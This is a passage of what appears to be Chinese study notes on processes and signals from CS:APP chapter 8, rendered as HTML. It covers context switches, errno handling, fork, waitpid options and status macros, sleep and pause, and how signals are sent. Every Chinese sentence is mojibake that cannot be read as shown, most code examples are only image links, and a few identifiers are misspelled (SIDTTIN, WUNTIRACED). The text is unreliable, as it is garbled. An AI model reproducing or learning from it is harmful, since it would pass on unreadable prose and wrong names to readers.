·çš„å°è¯•éƒ½ä¼šå¯¼è‡´è‡´å‘½çš„ä¿æŠ¤æ•…éšœã€‚åä¹‹ï¼Œç”¨æˆ·ç¨‹åºå¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥å£é—´æ¥åœ°è®¿é—®å†…æ ¸ä»£ç å’Œæ•°æ®ã€‚</p><h4 id="825-ä¸Šä¸‹æ–‡åˆ‡æ¢"><a class="markdownIt-Anchor" href="#825-ä¸Šä¸‹æ–‡åˆ‡æ¢"></a> 8.2.5 ä¸Šä¸‹æ–‡åˆ‡æ¢</h4><p>æ“ä½œç³»ç»Ÿå†…æ ¸ä½¿ç”¨ä¸€ç§ç§°ä¸º<strong>ä¸Šä¸‹æ–‡åˆ‡æ¢</strong>çš„è¾ƒé«˜å±‚å½¢å¼çš„å¼‚å¸¸æ§åˆ¶æµæ¥å®ç°å¤šä»»åŠ¡ã€‚</p><p><strong>ä¸Šä¸‹æ–‡</strong>å°±æ˜¯å†…æ ¸é‡æ–°å¯åŠ¨ä¸€ä¸ªè¢«æŠ¢å çš„è¿›ç¨‹æ‰€éœ€çš„çŠ¶æ€ã€‚å®ƒç”±ä¸€äº›å¯¹è±¡çš„å€¼ç»„æˆï¼Œè¿™äº›å¯¹è±¡åŒ…æ‹¬é€šç”¨ç›®çš„å¯„å­˜å™¨ã€æµ®ç‚¹å¯„å­˜å™¨ã€ç¨‹åºè®¡æ•°å™¨ã€ç”¨æˆ·æ ˆã€çŠ¶æ€å¯„å­˜å™¨ã€å†…æ ¸æ ˆå’Œå„ç§å†…æ ¸æ•°æ®ç»“æ„ï¼Œæ¯”å¦‚æç»˜åœ°å€ç©ºé—´çš„é¡µè¡¨ã€åŒ…å«æœ‰å…³å½“å‰è¿›ç¨‹ä¿¡æ¯çš„è¿›ç¨‹è¡¨ï¼Œä»¥åŠåŒ…å«è¿›ç¨‹å·²æ‰“å¼€æ–‡ä»¶çš„ä¿¡æ¯çš„æ–‡ä»¶è¡¨ã€‚<br>åœ¨è¿›ç¨‹æ‰§è¡Œçš„æŸäº›æ—¶åˆ»ï¼Œå†…æ ¸å¯ä»¥å†³å®šæŠ¢å å½“å‰è¿›ç¨‹ï¼Œå¹¶é‡æ–°å¼€å§‹ä¸€ä¸ªå…ˆå‰è¢«æŠ¢å çš„è¿›ç¨‹ã€‚è¿™ç§å†³å®šå°±å«åš<strong>è°ƒåº¦</strong>( schedule),æ˜¯ç”±å†…æ ¸ä¸­ç§°ä¸º<strong>è°ƒåº¦å™¨</strong>( scheduler)çš„ä»£ç å¤„ç†çš„ã€‚å½“å†…æ ¸é€‰æ‹©ä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬å°±è¯´å†…æ ¸è°ƒåº¦äº†è¿™ä¸ªè¿›ç¨‹ã€‚åœ¨å†…æ ¸è°ƒåº¦äº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œåï¼Œå®ƒå°±æŠ¢å å½“å‰è¿›ç¨‹ï¼Œå¹¶ä½¿ç”¨ä¸€ç§ç§°ä¸ºä¸Šä¸‹æ–‡åˆ‡æ¢çš„æœºåˆ¶æ¥å°†æ§åˆ¶è½¬ç§»åˆ°æ–°çš„è¿›ç¨‹ã€‚</p><p><strong>ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š</strong></p><ol><li><p>ä¿å­˜å½“å‰è¿›ç¨‹çš„ä¸Šä¸‹æ–‡</p></li><li><p>æ¢å¤æŸä¸ªå…ˆå‰è¢«æŠ¢å çš„è¿›ç¨‹è¢«ä¿å­˜çš„ä¸Šä¸‹æ–‡</p></li><li><p>å°†æ§åˆ¶ä¼ é€’ç»™è¿™ä¸ªæ–°æ¢å¤çš„è¿›ç¨‹ã€‚</p></li></ol><p><img src="/posts/e0eae192/image-20210615194036573.png" alt="image-20210615194036573"></p><hr><h3 id="83-ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†"><a class="markdownIt-Anchor" href="#83-ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†"></a> 8.3 ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†</h3><p>å½“Unixç³»ç»Ÿçº§å‡½æ•°é‡åˆ°é”™è¯¯æ—¶ï¼Œå®ƒä»¬å…¸å‹åœ°è¿”å›-1,å¹¶è®¾ç½®å…¨å±€æ•´æ•°å˜é‡errnoæ¥è¡¨ç¤ºä»€ä¹ˆå‡ºé”™äº†ã€‚</p><p><img src="/posts/e0eae192/image-20210615194451811.png" alt="image-20210615194451811"></p><p>ç®€åŒ–</p><p><img src="/posts/e0eae192/image-20210615194500771.png" alt="image-20210615194500771"></p><p>å†ç®€åŒ–</p><p><img src="/posts/e0eae192/image-20210615194519890.png" alt="image-20210615194519890"></p><p>å†ç®€åŒ–</p><p><img src="/posts/e0eae192/image-20210615194534416.png" alt="image-20210615194534416"></p><hr><h3 id="84-è¿›ç¨‹æ§åˆ¶"><a class="markdownIt-Anchor" href="#84-è¿›ç¨‹æ§åˆ¶"></a> 8.4 è¿›ç¨‹æ§åˆ¶</h3><h4 id="841-è·å–è¿›ç¨‹id"><a class="markdownIt-Anchor" href="#841-è·å–è¿›ç¨‹id"></a> 8.4.1 è·å–è¿›ç¨‹ID</h4><p><img src="/posts/e0eae192/image-20210615200923542.png" alt="image-20210615200923542"></p><h4 id="842-åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹"><a class="markdownIt-Anchor" href="#842-åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹"></a> 8.4.2 åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹</h4><p>ä»ç¨‹åºå‘˜çš„è§’åº¦ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿›ç¨‹æ€»æ˜¯å¤„äºä¸‹é¢ä¸‰ç§çŠ¶æ€ä¹‹ä¸€ï¼š</p><ul><li><p><strong>è¿è¡Œ</strong>ã€‚è¿›ç¨‹è¦ä¹ˆåœ¨CPUä¸Šæ‰§è¡Œï¼Œè¦ä¹ˆåœ¨ç­‰å¾…è¢«æ‰§è¡Œä¸”æœ€ç»ˆä¼šè¢«å†…æ ¸è°ƒåº¦ã€‚</p></li><li><p><strong>åœæ­¢</strong>ã€‚è¿›ç¨‹çš„æ‰§è¡Œè¢«æŒ‚èµ·( suspend),ä¸”ä¸ä¼šè¢«è°ƒåº¦ã€‚å½“æ”¶åˆ° SIGSTOPã€ SIGTSTPã€SIDTTINæˆ–è€… SIGTTOUä¿¡å·æ—¶ï¼Œè¿›ç¨‹å°±åœæ­¢ï¼Œå¹¶ä¸”ä¿æŒåœæ­¢ç›´åˆ°å®ƒæ”¶åˆ°ä¸€ä¸ª SIGCONTä¿¡å·ï¼Œåœ¨è¿™ä¸ªæ—¶åˆ»ï¼Œè¿›ç¨‹å†æ¬¡å¼€å§‹è¿è¡Œã€‚</p></li><li><p><strong>ç»ˆæ­¢</strong>ã€‚è¿›ç¨‹æ°¸è¿œåœ°åœæ­¢äº†ã€‚è¿›ç¨‹ä¼šå› ä¸ºä¸‰ç§åŸå› ç»ˆæ­¢ï¼š</p><ol><li><p>æ”¶åˆ°ä¸€ä¸ªä¿¡å·ï¼Œè¯¥ä¿¡å·çš„é»˜è®¤è¡Œä¸ºæ˜¯ç»ˆæ­¢è¿›ç¨‹ï¼Œ</p></li><li><p>ä»ä¸»ç¨‹åºè¿”å›</p></li><li><p>è°ƒç”¨exitå‡½æ•°ã€‚</p></li></ol></li></ul><p><strong>å­è¿›ç¨‹ï¼ˆforkå‡½æ•°å¦‚ä½•åˆ›å»ºï¼‰ï¼š<strong>æ–°åˆ›å»ºçš„å­è®²ç¨‹å‡ ä¹ä½†ä¸å®Œå…¨ä¸çˆ¶è¿›ç¨‹ç›¸åŒã€‚å­è¿›ç¨‹å¾—åˆ°ä¸çˆ¶è¿›ç¨‹ç”¨æˆ·çº§è™šæ‹Ÿåœ°å€ç©ºé—´ç›¸åŒçš„ï¼ˆä½†æ˜¯ç‹¬ç«‹çš„ï¼‰ä¸€ä»½æ‹·è´ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€æ•°æ®å’Œbssæ®µã€å †ä»¥åŠç”¨æˆ·æ ˆã€‚å­è¿›ç¨‹è¿˜è·å¾—ä¸çˆ¶è¿›ç¨‹ä»»ä½•æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ç›¸åŒçš„æ‹·è´ï¼Œè¿™å°±æ„å‘³ç€å½“çˆ¶è¿›ç¨‹è°ƒç”¨forkæ—¶ï¼Œå­è¿›ç¨‹å¯ä»¥è¯»å†™çˆ¶è¿›ç¨‹ä¸­æ‰“å¼€çš„ä»»ä½•æ–‡ä»¶ã€‚çˆ¶è¿›ç¨‹å’Œæ–°åˆ›å»ºçš„å­è¿›ç¨‹ä¹‹é—´</strong>æœ€å¤§çš„åŒºåˆ«</strong>åœ¨äºå®ƒä»¬æœ‰<strong>ä¸åŒçš„PID</strong>ã€‚</p><p>ç¤ºä¾‹ç¨‹åºï¼š</p><p><img src="/posts/e0eae192/image-20210615201819338.png" alt="image-20210615201819338"></p><p>**forkå‡½æ•°çš„ç‰¹ç‚¹ï¼š**è°ƒç”¨ä¸€æ¬¡ï¼Œè¿”å›ä¸¤æ¬¡ä¸€æ¬¡æ˜¯åœ¨è°ƒç”¨è¿›ç¨‹ï¼ˆçˆ¶è¿›ç¨‹ï¼‰ä¸­ï¼Œä¸€æ¬¡æ˜¯åœ¨æ–°åˆ›å»ºçš„å­è¿›ç¨‹ä¸­ã€‚åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›å­è¿›ç¨‹çš„<br>PIDã€‚åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkè¿”å›0ã€‚å› ä¸ºå­è¿›ç¨‹çš„PIDæ€»æ˜¯éé›¶çš„ï¼Œè¿”å›å€¼å°±æä¾›ä¸€ä¸ªæ˜ç¡®çš„æ–¹æ³•æ¥åˆ†è¾¨ç¨‹åºæ˜¯åœ¨çˆ¶è¿›ç¨‹è¿˜æ˜¯åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œã€‚</p><p><strong>è¿™ä¸ªä¾‹å­ï¼ˆçˆ¶å­è¿›ç¨‹ï¼‰çš„ä¸€äº›ç‰¹ç‚¹ï¼š</strong></p><ul><li><p>**è°ƒç”¨ä¸€æ¬¡ï¼Œè¿”å›ä¸¤æ¬¡ã€‚**forkå‡½æ•°è¢«çˆ¶è¿›ç¨‹è°ƒç”¨ä¸€æ¬¡ï¼Œä½†æ˜¯å´è¿”å›ä¸¤æ¬¡ã€‚ä¸€æ¬¡æ˜¯è¿”å›åˆ°çˆ¶è¿›ç¨‹ï¼Œä¸€æ¬¡æ˜¯è¿”å›åˆ°æ–°åˆ›å»ºçš„å­è¿›ç¨‹ã€‚</p></li><li><p>**å¹¶å‘æ‰§è¡Œã€‚**çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹æ˜¯å¹¶å‘è¿è¡Œçš„ç‹¬ç«‹è¿›ç¨‹ã€‚å†…æ ¸èƒ½å¤Ÿä»¥ä»»æ„æ–¹å¼äº¤æ›¿æ‰§è¡Œå®ƒä»¬çš„é€»è¾‘æ§åˆ¶æµä¸­çš„æŒ‡ä»¤ã€‚å½“æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸Šè¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œçˆ¶è¿›ç¨‹å…ˆå®Œæˆå®ƒçš„ printfè¯­å¥ï¼Œç„¶åæ˜¯å­è¿›ç¨‹ã€‚ç„¶è€Œï¼Œåœ¨å¦ä¸€ä¸ªç³»ç»Ÿä¸Šå¯èƒ½æ­£å¥½ç›¸åã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä½œä¸ºç¨‹åºå‘˜ï¼Œæˆ‘ä»¬å†³ä¸èƒ½å¯¹ä¸åŒè¿›ç¨‹ä¸­æŒ‡ä»¤çš„äº¤æ›¿æ‰§è¡Œåšä»»ä½•å‡è®¾ã€‚</p></li><li><p>**ç›¸åŒçš„ä½†æ˜¯ç‹¬ç«‹çš„åœ°å€ç©ºé—´ã€‚**å¦‚æœèƒ½å¤Ÿåœ¨forkå‡½æ•°åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¸­è¿”å›åç«‹å³æš‚åœè¿™ä¸¤ä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´éƒ½æ˜¯ç›¸åŒçš„ã€‚æ¯ä¸ªè¿›ç¨‹æœ‰ç›¸åŒçš„ç”¨æˆ·æ ˆã€ç›¸åŒçš„æœ¬åœ°å˜é‡å€¼ã€ç›¸åŒçš„å †ã€ç›¸åŒçš„å…¨å±€å˜é‡å€¼ï¼Œä»¥åŠç›¸åŒçš„ä»£ç ã€‚</p><p>å› æ­¤ï¼Œåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ç¨‹åºä¸­ï¼Œå½“forkå‡½æ•°åœ¨ç¬¬8è¡Œè¿”å›æ—¶ï¼Œæœ¬åœ°å˜é‡xåœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¸­éƒ½ä¸º1ã€‚ç„¶è€Œå› ä¸ºçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹æ˜¯ç‹¬ç«‹çš„è¿›ç¨‹ï¼Œå®ƒä»¬éƒ½æœ‰è‡ªå·±çš„ç§æœ‰åœ°å€ç©ºé—´ã€‚çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹å¯¹æ‰€åšçš„ä»»ä½•æ”¹å˜éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä¸ä¼šåæ˜ åœ¨å¦ä¸€ä¸ªè¿›ç¨‹çš„å­˜å‚¨å™¨ä¸­ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå½“çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹è°ƒç”¨å®ƒä»¬å„è‡ªçš„ printfè¯­å¥æ—¶ï¼Œå®ƒä»¬ä¸­çš„å˜é‡xä¼šæœ‰ä¸åŒçš„å€¼çš„åŸå› ã€‚</p></li><li><p>**å…±äº«æ–‡ä»¶ã€‚**å½“è¿è¡Œè¿™ä¸ªç¤ºä¾‹ç¨‹åºæ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹éƒ½æŠŠå®ƒä»¬çš„è¾“å‡ºæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚åŸå› æ˜¯å­è¿›ç¨‹ç»§æ‰¿äº†çˆ¶è¿›ç¨‹æ‰€æœ‰çš„æ‰“å¼€æ–‡ä»¶ã€‚å½“çˆ¶è¿›ç¨‹è°ƒç”¨forkæ—¶ï¼Œ stdoutæ–‡ä»¶æ˜¯è¢«æ‰“å¼€çš„ï¼Œå¹¶æŒ‡å‘å±å¹•ã€‚å­è¿›ç¨‹ç»§æ‰¿äº†è¿™ä¸ªæ–‡ä»¶ï¼Œå› æ­¤å®ƒçš„è¾“å‡ºä¹Ÿæ˜¯æŒ‡å‘å±å¹•çš„ã€‚</p></li></ul><p><img src="/posts/e0eae192/image-20210615201857583.png" alt="image-20210615201857583"></p><h4 id="843-å›æ”¶å­è¿›ç¨‹"><a class="markdownIt-Anchor" href="#843-å›æ”¶å­è¿›ç¨‹"></a> 8.4.3 å›æ”¶å­è¿›ç¨‹</h4><p>**åƒµæ­»è¿›ç¨‹ï¼š**ä¸€ä¸ªç»ˆæ­¢äº†ä½†æœªè¢«å›æ”¶çš„è¿›ç¨‹</p><p><strong>waitpidå‡½æ•°ï¼š</strong></p><p><img src="/posts/e0eae192/image-20210615203910901.png" alt="image-20210615203910901"></p><p>é»˜è®¤åœ°(å½“ options=0æ—¶)ï¼Œ waitpid<strong>æŒ‚èµ·</strong>è°ƒç”¨è¿›ç¨‹çš„æ‰§è¡Œï¼Œç›´åˆ°å®ƒçš„ç­‰å¾…é›†åˆä¸­çš„ä¸€ä¸ªå­è¿›ç¨‹ç»ˆæ­¢ã€‚</p><p>å¦‚æœç­‰å¾…é›†åˆä¸­çš„ä¸€ä¸ªè¿›ç¨‹åœ¨åˆšè°ƒç”¨çš„æ—¶åˆ»å°±å·²ç»ç»ˆæ­¢äº†ï¼Œé‚£ä¹ˆ waitpidå°±ç«‹å³è¿”å›ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œ waitpidè¿”å›å¯¼è‡´ waitpidè¿”å›çš„<strong>å·²ç»ˆæ­¢å­è¿›ç¨‹çš„PID</strong>,å¹¶ä¸”å°†è¿™ä¸ªå·²ç»ˆæ­¢çš„å­è¿›ç¨‹ä»ç³»ç»Ÿä¸­å»é™¤ã€‚</p><ol><li><p><strong>åˆ¤æ–­ç­‰å¾…é›†åˆçš„æˆå‘˜</strong></p><p>ç­‰å¾…é›†åˆçš„æˆå‘˜æ˜¯ç”±å‚æ•°pidæ¥ç¡®å®šçš„ï¼š</p><ul><li>å¦‚æœpid&gt;0,é‚£ä¹ˆç­‰å¾…é›†åˆå°±æ˜¯ä¸€ä¸ªå•ç‹¬çš„å­è¿›ç¨‹ï¼Œå®ƒçš„è¿›ç¨‹Dç­‰äºpid</li><li>å¦‚æœpid=-1,é‚£ä¹ˆç­‰å¾…é›†åˆå°±æ˜¯ç”±çˆ¶è¿›ç¨‹æ‰€æœ‰çš„å­è¿›ç¨‹ç»„æˆçš„ã€‚</li></ul></li><li><p><strong>ä¿®æ”¹é»˜è®¤è¡Œä¸º</strong></p><p>å¯ä»¥é€šè¿‡å°† optionsè®¾ç½®ä¸ºå¸¸é‡ WNOHANGå’ŒWUNTIRACEDçš„å„ç§ç»„åˆï¼Œä¿®æ”¹é»˜è®¤è¡Œä¸º</p><ul><li>**WNOHANG:**å¦‚æœç­‰å¾…é›†åˆä¸­çš„ä»»ä½•å­è¿›ç¨‹éƒ½è¿˜æ²¡æœ‰ç»ˆæ­¢ï¼Œé‚£ä¹ˆå°±ç«‹å³è¿”å›ï¼ˆè¿”å›å€¼ä¸º0)ã€‚é»˜è®¤çš„è¡Œä¸ºæ˜¯æŒ‚èµ·è°ƒç”¨è¿›ç¨‹ï¼Œç›´åˆ°æœ‰å­è¿›ç¨‹ç»ˆæ­¢ã€‚åœ¨ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢çš„åŒæ—¶ï¼Œå¦‚æœè¿˜æƒ³åšäº›æœ‰ç”¨çš„å·¥ä½œï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæœ‰ç”¨</li><li>**WUNTRACED:**æŒ‚èµ·è°ƒç”¨è¿›ç¨‹çš„æ‰§è¡Œï¼Œç›´åˆ°ç­‰å¾…é›†åˆä¸­çš„ä¸€ä¸ªè¿›ç¨‹å˜æˆå·²ç»ˆæ­¢æˆ–è€…è¢«åœæ­¢ã€‚è¿”å›çš„PDä¸ºå¯¼è‡´è¿”å›çš„å·²ç»ˆæ­¢æˆ–è¢«åœæ­¢å­è¿›ç¨‹çš„PDã€‚é»˜è®¤çš„è¡Œä¸ºæ˜¯åªè¿”å›å·²ç»ˆæ­¢çš„å­è¿›ç¨‹ã€‚å½“ä½ æƒ³è¦æ£€æŸ¥å·²ç»ˆæ­¢å’Œè¢«åœæ­¢çš„å­è¿›ç¨‹æ—¶ï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæœ‰ç”¨ã€‚</li><li><strong>WNOHANG|WUNTRACED</strong>:ç«‹å³è¿”å›ï¼Œå¦‚æœç­‰å¾…é›†åˆä¸­æ²¡æœ‰ä»»ä½•å­è¿›ç¨‹è¢«åœæ­¢æˆ–å·²ç»ˆæ­¢ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸º0,æˆ–è€…è¿”å›å€¼ç­‰äºé‚£ä¸ªè¢«åœæ­¢æˆ–è€…å·²ç»ˆæ­¢çš„å­è¿›ç¨‹çš„PIDã€‚</li></ul></li><li><p><strong>æ£€æŸ¥å·²å›æ”¶å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€</strong></p><p>å¦‚æœ statuså‚æ•°æ˜¯éç©ºçš„ï¼Œé‚£ä¹ˆ waitpidå°±ä¼šåœ¨ statuså‚æ•°ä¸­æ”¾ä¸Šå…³äºå¯¼è‡´è¿”å›çš„å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ã€‚wait,hå¤´æ–‡ä»¶å®šä¹‰äº†è§£é‡Š statuså‚æ•°çš„å‡ ä¸ªå®ï¼š</p><ul><li><strong>WIFEXITED(status)</strong>ï¼šå¦‚æœå­è¿›ç¨‹é€šè¿‡è°ƒç”¨exitæˆ–è€…ä¸€ä¸ªè¿”å›(return)æ­£å¸¸ç»ˆæ­¢ï¼Œå°±è¿”å›çœŸã€‚</li><li><strong>WEXITSTATUS(status):</strong> è¿”å›ä¸€ä¸ªæ­£å¸¸ç»ˆæ­¢çš„å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ã€‚åªæœ‰åœ¨ WIFEXITEDè¿”å›ä¸ºçœŸæ—¶ï¼Œæ‰ä¼šå®šä¹‰è¿™ä¸ªçŠ¶æ€ã€‚</li><li><strong>WIFSIGNALED(status):</strong> å¦‚æœå­è¿›ç¨‹æ˜¯å› ä¸ºä¸€ä¸ªæœªè¢«æ•è·çš„ä¿¡å·ç»ˆæ­¢çš„ï¼Œé‚£ä¹ˆå°±è¿”å›çœŸ(å°†åœ¨8.5èŠ‚ä¸­è§£é‡Šè¯´æ˜ä¿¡å·)ã€‚</li><li><strong>WTERMSIG(status):</strong> è¿”å›å¯¼è‡´å­è¿›ç¨‹ç»ˆæ­¢çš„ä¿¡å·çš„æ•°é‡ã€‚åªæœ‰åœ¨ WIFSIGNALED(status)è¿”å›ä¸ºçœŸæ—¶ï¼Œæ‰å®šä¹‰è¿™ä¸ªçŠ¶æ€ã€‚</li><li><strong>WIFSTOPPED(status):</strong> å¦‚æœå¼•èµ·è¿”å›çš„å­è¿›ç¨‹å½“å‰æ˜¯è¢«åœæ­¢çš„ï¼Œé‚£ä¹ˆå°±è¿”å›çœŸã€‚</li><li>WSTOPSIG(status): è¿”å›å¼•èµ·å­è¿›ç¨‹åœæ­¢çš„ä¿¡å·çš„æ•°é‡ã€‚åªæœ‰åœ¨ WIFSTOPPED(status)è¿”å›ä¸ºçœŸæ—¶ï¼Œæ‰å®šä¹‰è¿™ä¸ªçŠ¶æ€ã€‚</li></ul></li><li><p><strong>é”™è¯¯æ¡ä»¶</strong></p><p>å¦‚æœè°ƒç”¨è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œé‚£ä¹ˆ waitpidè¿”å›-1,å¹¶ä¸”è®¾ç½® errnoä¸º <strong>ECHILD</strong>ã€‚å¦‚æœwaitpidå‡½æ•°è¢«ä¸€ä¸ªä¿¡å·ä¸­æ–­ï¼Œé‚£ä¹ˆå®ƒè¿”å›-1,å¹¶è®¾ç½® errnoä¸º <strong>EINTR</strong>ã€‚</p></li><li><p>wait<strong>å‡½æ•°</strong></p><p><img src="/posts/e0eae192/image-20210615205135841.png" alt="image-20210615205135841"></p></li></ol><h4 id="844-è®©è¿›ç¨‹ä¼‘çœ "><a class="markdownIt-Anchor" href="#844-è®©è¿›ç¨‹ä¼‘çœ "></a> 8.4.4 è®©è¿›ç¨‹ä¼‘çœ </h4><p><strong>sleepå‡½æ•°</strong></p><p><img src="/posts/e0eae192/image-20210615205249733.png" alt="image-20210615205249733"></p><p><strong>pauseå‡½æ•°</strong></p><p><img src="/posts/e0eae192/image-20210615205335143.png" alt="image-20210615205335143"></p><h4 id="845-åŠ è½½å¹¶è¿è¡Œç¨‹åº"><a class="markdownIt-Anchor" href="#845-åŠ è½½å¹¶è¿è¡Œç¨‹åº"></a> 8.4.5 åŠ è½½å¹¶è¿è¡Œç¨‹åº</h4><h4 id="846-åˆ©ç”¨forkå’Œexecveè¿è¡Œç¨‹åº"><a class="markdownIt-Anchor" href="#846-åˆ©ç”¨forkå’Œexecveè¿è¡Œç¨‹åº"></a> 8.4.6 åˆ©ç”¨forkå’Œexecveè¿è¡Œç¨‹åº</h4><hr><h3 id="85-ä¿¡å·"><a class="markdownIt-Anchor" href="#85-ä¿¡å·"></a> 8.5 ä¿¡å·</h3><p><strong>ä¿¡å·</strong>å°±æ˜¯ä¸€æ¡å°æ¶ˆæ¯ï¼Œå®ƒé€šçŸ¥è¿›ç¨‹ç³»ç»Ÿä¸­å‘å°„äº†ä¸€ä¸ªæŸç§ç±»å‹çš„äº‹ä»¶ã€‚</p><p><img src="/posts/e0eae192/image-20210616132126470.png" alt="image-20210616132126470"></p><h4 id="851-ä¿¡å·æœ¯è¯­"><a class="markdownIt-Anchor" href="#851-ä¿¡å·æœ¯è¯­"></a> 8.5.1 ä¿¡å·æœ¯è¯­</h4><p>ä¼ é€ä¸€ä¸ªä¿¡å·åˆ°ç›®çš„è¿›ç¨‹æ˜¯ç”±ä¸¤ä¸ªä¸åŒæ­¥éª¤ç»„æˆçš„ï¼š</p><ul><li><strong>å‘é€ä¿¡å·</strong>ã€‚å†…æ ¸é€šè¿‡æ›´æ–°ç›®çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­çš„æŸä¸ªçŠ¶æ€ï¼Œå‘é€ï¼ˆé€’é€ï¼‰ä¸€ä¸ªä¿¡å·ç»™ç›®çš„è¿›ç¨‹ã€‚å‘é€ä¿¡å·å¯ä»¥æœ‰å¦‚ä¸‹ä¸¤ä¸ªåŸå› ï¼š<ul><li><ol><li>å†…æ ¸æ£€æµ‹åˆ°ä¸€ä¸ªç³»ç»Ÿäº‹ä»¶ï¼Œæ¯”å¦‚è¢«é›¶é™¤é”™è¯¯æˆ–è€…<br>å­è¿›ç¨‹ç»ˆæ­¢ã€‚</li></ol></li><li><ol start="2"><li>ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨äº†killå‡½æ•°ï¼ˆåœ¨ä¸‹ä¸€èŠ‚ä¸­è®¨è®ºï¼‰ï¼Œæ˜¾å¼åœ°è¦æ±‚å†…æ ¸å‘é€ä¸€ä¸ªä¿¡å·ç»™ç›®çš„è¿›ç¨‹ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥å‘é€ä¿¡å·ç»™å®ƒè‡ªå·±ã€‚</li></ol></li></ul></li><li><strong>æ¥æ”¶ä¿¡å·</strong>ã€‚å½“ç›®çš„è¿›ç¨‹è¢«å†…æ ¸å¼ºè¿«ä»¥æŸç§æ–¹å¼å¯¹ä¿¡å·çš„å‘é€åšå‡ºååº”æ—¶ï¼Œç›®çš„è¿›ç¨‹å°±æ¥æ”¶äº†ä¿¡å·ã€‚è¿›ç¨‹å¯ä»¥å¿½ç•¥è¿™ä¸ªä¿¡å·ï¼Œç»ˆæ­¢æˆ–è€…é€šè¿‡æ‰§è¡Œä¸€ä¸ªç§°ä¸ºä¿¡å·å¤„ç†ç¨‹åºï¼ˆsignal handler)çš„ç”¨æˆ·å±‚å‡½æ•°æ•è·è¿™ä¸ªä¿¡å·ã€‚</li></ul><p><img src="/posts/e0eae192/image-20210616134151781-1623822116278.png" alt="image-20210616134151781"></p><p>**å¾…å¤„ç†ä¿¡å·ï¼ˆpending signal)ï¼š**ä¸€ä¸ªåªå‘å‡ºè€Œæ²¡æœ‰è¢«æ¥æ”¶çš„ä¿¡å·ã€‚</p><ul><li><p>åœ¨ä»»ä½•æ—¶åˆ»ï¼Œä¸€ç§ç±»å‹åªä¼šæœ‰æœ‰ä¸€ä¸ªå¾…å¤„ç†ä¿¡å·ã€‚</p></li><li><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰é€‰æ‹©æ€§åœ°é˜»å¡æ¥å—æŸç§ä¿¡å·ã€‚å½“ä¸€ç§ä¿¡å·è¢«é˜»å¡æ—¶ï¼Œå®ƒä»å¯ä»¥è¢«å‘é€ï¼Œä½†æ˜¯äº§ç”Ÿçš„å¾…å¤„ç†ä¿¡å·ä¸ä¼šè¢«æ¥å—ï¼ŒçŸ¥é“è¿›ç¨‹å–æ¶ˆå¯¹è¿™ç§ä¿¡å·çš„é˜»å¡ã€‚</p></li><li><p>ä¸€ä¸ªå¾…å¤„ç†ä¿¡å·æœ€å¤šè¢«æ¥å—ä¸€æ¬¡ã€‚</p></li></ul><h4 id="852-å‘é€ä¿¡å·"><a class="markdownIt-Anchor" href="#852-å‘é€ä¿¡å·"></a> 8.5.2 å‘é€ä¿¡å·</h4><ol><li><p><strong>è¿›ç¨‹ç»„</strong></p><p><img src="/posts/e0eae192/image-20210616135725636.png" alt="image-20210616135725636"></p><p><img src="/posts/e0eae192/image-20210616135744711.png" alt="image-20210616135744711"></p></li><li><p><strong>ç”¨/bin/killç¨‹åºå‘é€ä¿¡å·</strong></p><p><img src="/posts/e0eae192/image-20210616135759238.png" alt="image-20210616135759238"></p></li><li><p><strong>ä»é”®ç›˜å‘é€ä¿¡å·</strong></p><p><img src="/posts/e0eae192/image-20210616140206513.png" alt="image-20210616140206513"></p><p><img src="/posts/e0eae192/image-20210616140217571.png" alt="image-20210616140217571"></p></li><li><p><strong>ç”¨killå‡½æ•°å‘é€ä¿¡å·</strong></p><p><img src="/posts/e0eae192/image-20210616140454210.png" alt="image-20210616140454210"></p></li><li><p><strong>ç”¨alarmå‡½æ•°å‘ç”Ÿä¿¡å·</strong></p><p><img src="/posts/e0eae192/image-20210616141623550.png" alt="image-20210616141623550"></p><p><img src="/posts/e0eae192/image-20210616141648506.png" 